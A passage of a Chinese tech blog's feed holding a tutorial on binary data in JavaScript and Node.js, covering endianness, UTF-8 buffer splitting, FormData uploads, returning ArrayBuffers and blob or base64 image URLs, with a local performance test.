      &lt;p&gt;正如标题那样，Promise对未来某个事件做出承诺，比如&lt;code&gt;如果成功，那么...；如果失败，那么...&lt;/code&gt;。是一种相对于回调和事件订阅更高级的抽象，本文就从其起源，实现，面临的问题等方面分析Promise。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="异步编程" scheme="http://luoxia.me/code/tags/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>二进制数据处理问题</title>
    <link href="http://luoxia.me/code/2016/08/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/"/>
    <id>http://luoxia.me/code/2016/08/22/二进制数据处理问题/</id>
    <published>2016-08-22T03:11:15.000Z</published>
    <updated>2017-11-16T13:10:06.490Z</updated>
    
    <content type="html"><![CDATA[<p>二进制数据的处理在开发中是非常普遍和重要的，文件I/O,网络I/O，HTML5 Canvas/WebGL,音频数据的处理等等，这些不管是从性能上考虑，还是对数据的精确处理上来考虑，二进制数据接口都是非常重要的。</p><p>ArrayBuffer是Js操作二进制数据的接口，到后来加入到了es6的标准，Blob对象存储原始数据，相当于是ArrayBuffer数据的超集，XHR二级提供了FormData来完成表单数据提交，并且还支持Blob对象的上传，我们可以用以文件上传，而Nodejs的Buffer作为js和C++结合模块，相当于对ArrayBuffer的封装以更加方便的进行二进制数据的操作。</p><p>本文就一些遇到的问题进行总结。将会涉及上述相关知识</p><p><strong>文章目录</strong></p><ol><li>字节序问题</li><li>编码问题</li><li>客户端发送FormData（文件上传）</li><li>node向客户端发送ArrayBuffer</li><li>综合实例</li><li>性能测试<a id="more"></a></li></ol><h3 id="字节序问题"><a href="#字节序问题" class="headerlink" title="字节序问题"></a>字节序问题</h3><p>字节序指数据在内存中的储存方式，分为小端字节序和大端字节序，小端字节序：相对重要的字节排在后面的内存地址，相对不重要字节排在前面的内存地址。大端字节序相反。</p><p>举个栗子：<br>开辟内存空间储存二进制数据，并写入32位整数：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> int32View = <span class="keyword">new</span> <span class="built_in">Int32Array</span>(buffer);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;int32View.length; i++)&#123;</span><br><span class="line">int32View[i] = i * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>上面代码建立的32位整数视图，每个元素占4个字节，而用于储存的内存空间为16个字节，可以存4个元素。每个元素在内存当中是怎么储存的呢？</p><p>我们这时候再在这片内存上建立8位整数的视图，看看每一个元素是怎样的？<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> int8View = <span class="keyword">new</span> <span class="built_in">Int8Array</span>(buffer);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> int8View)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>可以看到在32位整数视图存的数字，对数值大小决定性更大的处于后面了。</p><p>记住这里是以字节为单位的，并不是每个位都会发生颠倒，而是字节的顺序。以第二个元素2为例，其在内存中的存在方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000010 00000000 00000000 00000000</span><br></pre></td></tr></table></figure></p><p>TypedArray视图只能以小端字节序处理数据，当我们需要大端字节序呢？</p><p>DataView复合视图。其get和set方法都提供第二个参数设置，默认情况下，DataView的get方法使用大端字节序解读数据，如果需要使用小端字节序解读，必须在get方法的第二个参数指定true。</p><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><p>看个例子：</p><p>我们在服务器上新建一个文本文件hello.txt:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好啊，欢迎来到罗峡的技术博客</span><br></pre></td></tr></table></figure><p>然后我们创建可读流读取：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">var</span> rs = fs.createReadStream(<span class="string">'./hello.txt'</span>,&#123;<span class="attr">highWaterMark</span>:<span class="number">11</span>&#125;);</span><br><span class="line">rs.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">    result += chunk;</span><br><span class="line">&#125;);</span><br><span class="line">rs.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好啊���欢迎来���罗峡的技术博���</span><br></pre></td></tr></table></figure></p><p>好气有木有，怎么会乱码呢？</p><p><strong>乱码的产生</strong><br>问题就在<strong>highWaterMark:11</strong>,我们设定了buffer的长度为11,我们在创建可读流的时候，默认以utf-8编码，而在utf-8下，中文字符占3个字节，整个文本的二进制储存如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Buffer e4 bd a0 e5 a5 bd e5 95 8a ef bf bd ef bf bd ef bf bd e6 ac a2 e8 bf 8e e6 9d a5 ef bf bd ef bf bd ef bf bd e7 bd 97 e5 b3 a1 e7 9a 84 e6 8a 80 e6 9c...&gt;</span><br></pre></td></tr></table></figure><p>每个16进制数据代表一个字节，三个才表示了一个字符，而我们设置了buffer长度为11个字节，表示三个字符后，剩余两个字节，和第二个buffer的前1个字节都不能正确解析，就乱码了。我们可以看到有3个乱码正是3个字节。</p><p><strong>setEncoding(‘utf-8’)的作用：</strong></p><p>这时候data事件的chunk不再是buffer，而是经过编码后的字符串，可读流在内部设置了decoder对象，每次data事件，通过该对象进行解码，这个对象知道宽字符在UTF-8下是3个字节方式储存的，所以每次就会根据buffer大小来读取最大的3的整数个 字节，剩余的2个字节留下来和第二段buffer的第一个字节一起读。</p><p><strong>正确拼接buffer</strong><br>虽然setEncoding能够解决大部分问题，但是对一些编码是不支持的，我们需要正确的拼接buffer:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> chunks = [];</span><br><span class="line">res.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">chunks.push(chunk);</span><br><span class="line">&#125;);</span><br><span class="line">res.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> buf = Buffer.concat(chunks);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="客户端向node发送FormData"><a href="#客户端向node发送FormData" class="headerlink" title="客户端向node发送FormData"></a>客户端向node发送FormData</h3><p>FormData是HTML5 XHR2级新增的类型，用于表单数据上传。其作用其实与Jquery的serialize()方法，这个方法将传入的表达序列化为查询字符串的格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=123&amp;username=xx</span><br></pre></td></tr></table></figure></p><p>而FormData的好处是可以发送blob对象,file类型的input得到的文件就继承于blob,所以FormData可用于文件上传。</p><p>举个栗子：</p><p>客户端index.html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">'name'</span>&gt;</span>用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">id</span>=<span class="string">"name"</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">'file'</span>&gt;</span>文件<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">id</span>=<span class="string">'file'</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">required</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">id</span>=<span class="string">"sub"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>表单元素的name属性将作为键值对的键名。</p><p>客户端client.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"sub"</span>).addEventListener(<span class="string">"click"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> myFormData = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>));</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.open(<span class="string">"post"</span>,<span class="string">"http://localhost:8008/"</span>);</span><br><span class="line">        xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(xhr.status === <span class="number">200</span>)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'succuess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们来查看network:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/requestheder.png" alt="requestHeader"></p><p>我们在node端通过multiparty模块出来FormData数据：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> urlLib = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> multiparty = <span class="built_in">require</span>(<span class="string">'multiparty'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(parms.pathname === <span class="string">'/'</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> form = <span class="keyword">new</span> multiparty.Form();</span><br><span class="line">        form.parse(req,<span class="function"><span class="keyword">function</span>(<span class="params">err,fields,files</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'fileds:'</span> +fields + <span class="string">'files'</span> + files);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p><p>我们得到的打印结果：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server has been listened on <span class="number">8008</span></span><br><span class="line">&#123; <span class="attr">name</span>: [ <span class="string">'罗峡'</span> ], <span class="attr">password</span>: [ <span class="string">'hello'</span> ] &#125; &#123; <span class="attr">file</span>:</span><br><span class="line">   [ &#123; <span class="attr">fieldName</span>: <span class="string">'file'</span>,</span><br><span class="line">       originalFilename: <span class="string">''</span>,</span><br><span class="line">       path: <span class="string">'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\XJhnYHS1XylGbr2NQCYXBvLC'</span>,</span><br><span class="line">       headers: [<span class="built_in">Object</span>],</span><br><span class="line">       size: <span class="number">0</span> &#125; ] &#125;</span><br></pre></td></tr></table></figure></p><p>我们可以通过<strong>files.file[0].path</strong>获取第一个文件的文件路径。</p><h3 id="node端发送ArrayBuffer给客户端"><a href="#node端发送ArrayBuffer给客户端" class="headerlink" title="node端发送ArrayBuffer给客户端"></a>node端发送ArrayBuffer给客户端</h3><p>xhr2为ajax请求对象提供了response属性和responseType属性，前者根据后者的设置对服务端发送过来的数据进行解析。</p><p>比如我设置responseType为ArrayBuffer,response就返回ArrayBuffer,但是有一点需要注意的是，我们要保证服务端返回的数据是能够被解析成ArrayBuffer的。</p><p>客户端client.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.responseType = <span class="string">"arraybuffer"</span>;</span><br><span class="line">xhr.open(<span class="string">"get"</span>,<span class="string">"http://localhost:8008/"</span>);</span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.status === <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'succuess'</span>);</span><br><span class="line"><span class="keyword">var</span> buffer = xhr.response;</span><br><span class="line">        <span class="keyword">var</span> int8View = <span class="keyword">new</span> <span class="built_in">Int8Array</span>(buffer);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> element <span class="keyword">of</span> int8View)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p><p>node server.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res.writeHead(<span class="number">200</span>,&#123;<span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span>,<span class="string">'Content-Type'</span>:<span class="string">'application/octet-stream'</span>&#125;);</span><br><span class="line"><span class="keyword">var</span> typedView = <span class="keyword">new</span> <span class="built_in">Int16Array</span>([<span class="number">1</span>,<span class="number">6</span>,<span class="number">8</span>]);</span><br><span class="line">res.write(<span class="keyword">new</span> Buffer(typedView));</span><br><span class="line">res.end();</span><br></pre></td></tr></table></figure></p><p>这里要注意的是，需要设定’Content-type’为二进制文件，之前我没设置，以及后来我先写入数据再才设置这个响应头，客户端会一直报错：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http:<span class="comment">//localhost:8008/ net::ERR_INVALID_CHUNKED_ENCODING</span></span><br></pre></td></tr></table></figure></p><p>这都是因为没有设置文件类型响应头的结果。</p><h3 id="综合实例"><a href="#综合实例" class="headerlink" title="综合实例"></a>综合实例</h3><p>这个综合实例，我们先从客户端上传图片文件，然后服务端将图片的二进制数据发送给客户端，客户端再生成图片链接，客户端将图片文件显示出来。</p><p>生成的图片url可由两种方式，一种是blob形式和base64形式。</p><p>客户端index.html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">'name'</span>&gt;</span>用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">id</span>=<span class="string">"name"</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">'file'</span>&gt;</span>文件<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">id</span>=<span class="string">'file'</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">required</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> <span class="attr">id</span>=<span class="string">"sub"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>客户端client.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> resultBox = <span class="built_in">document</span>.getElementById(<span class="string">'result'</span>)</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"sub"</span>).addEventListener(<span class="string">"click"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> myFormData = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>));</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr.responseType = <span class="string">"arraybuffer"</span>;</span><br><span class="line">        xhr.open(<span class="string">"post"</span>,<span class="string">"http://localhost:8008/"</span>);</span><br><span class="line">        xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(xhr.status === <span class="number">200</span>)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'succuess'</span>);</span><br><span class="line"><span class="keyword">var</span> bb = <span class="keyword">new</span> Blob([xhr.response]);</span><br><span class="line">                resultBox.innerHTML = <span class="string">'&lt;img src="'</span> + <span class="built_in">window</span>.URL.createObjectURL(bb) +<span class="string">'"/&gt;'</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        xhr.send(myFormData);</span><br><span class="line">    &#125;,<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务端server.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> urlLib = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> multiparty = <span class="built_in">require</span>(<span class="string">'multiparty'</span>);</span><br><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> img;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> parms = urlLib.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(parms.pathname === <span class="string">'/'</span>)&#123; </span><br><span class="line">        <span class="keyword">var</span> form = <span class="keyword">new</span> multiparty.Form();</span><br><span class="line">        form.parse(req,<span class="function"><span class="keyword">function</span>(<span class="params">err,fields,files</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> readStream = fs.createReadStream(files.file[<span class="number">0</span>].path);</span><br><span class="line">            readStream.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;</span><br><span class="line">                bufs.push(chunk);</span><br><span class="line">            &#125;);</span><br><span class="line">            readStream.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                img = Buffer.concat(bufs);</span><br><span class="line">                res.writeHead(<span class="number">200</span>,&#123;<span class="string">'Access-Control-Allow-Origin'</span>:<span class="string">'*'</span>,<span class="string">'Access-Control-Allow-Method'</span>:<span class="string">'GET,POST'</span>,<span class="string">'Content-Type'</span>:<span class="string">'application/octet-stream'</span>&#125;);</span><br><span class="line">                res.write(img);</span><br><span class="line">                res.end();</span><br><span class="line">bufs = [];</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">8008</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server has been listened on 8008'</span>);</span><br></pre></td></tr></table></figure></p><p>我们查看结果:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/resultP.png" alt="result"><br>注意，上面的write一定要在数据读取完毕即readStream的end事件触发后才进行，不然会使得buffer为undefined.</p><p>我们查看上面的图片URL地址：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/blob.png" alt="blob"><br>发现是blob形式的，原因是我们通过<strong>window.URL.createObjectURL(bb) </strong>创建的 ，那如果我们想生存base64格式的url呢？</p><p>Just：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myBlob = <span class="keyword">new</span> Blob([xhr.response]);</span><br><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">reader.readAsDataURL(myBlob);</span><br><span class="line">reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    resultBox.innerHTML = <span class="string">'&lt;img src="'</span> + <span class="keyword">this</span>.result +<span class="string">'"/&gt;'</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>结果：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/base64.png" alt="base64"></p><h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><p>前面说过二进制数据操作对开发非常重要，最求更高的性能和数据的精确操作都离不开二进制操作，我们以网络I/O为例，看看非二进制操作和二进制操作的对比。</p><p>server.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> hello = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++)&#123;</span><br><span class="line">hello += <span class="string">'h'</span>;</span><br><span class="line">&#125;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">res.writeHead(<span class="number">200</span>);</span><br><span class="line">res.end(hello);</span><br><span class="line">&#125;).listen(<span class="number">8008</span>);</span><br></pre></td></tr></table></figure></p><p>然后我们通过Apache提供的ab工具，进行性能测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab -c 200 http://localhost:8008</span><br></pre></td></tr></table></figure></p><p>-c表示并发数，我们发起一次并发数为200的请求，看看结果：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/slowR.png" alt="slow"></p><p>然后我们在通过buffer形式进行传输：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 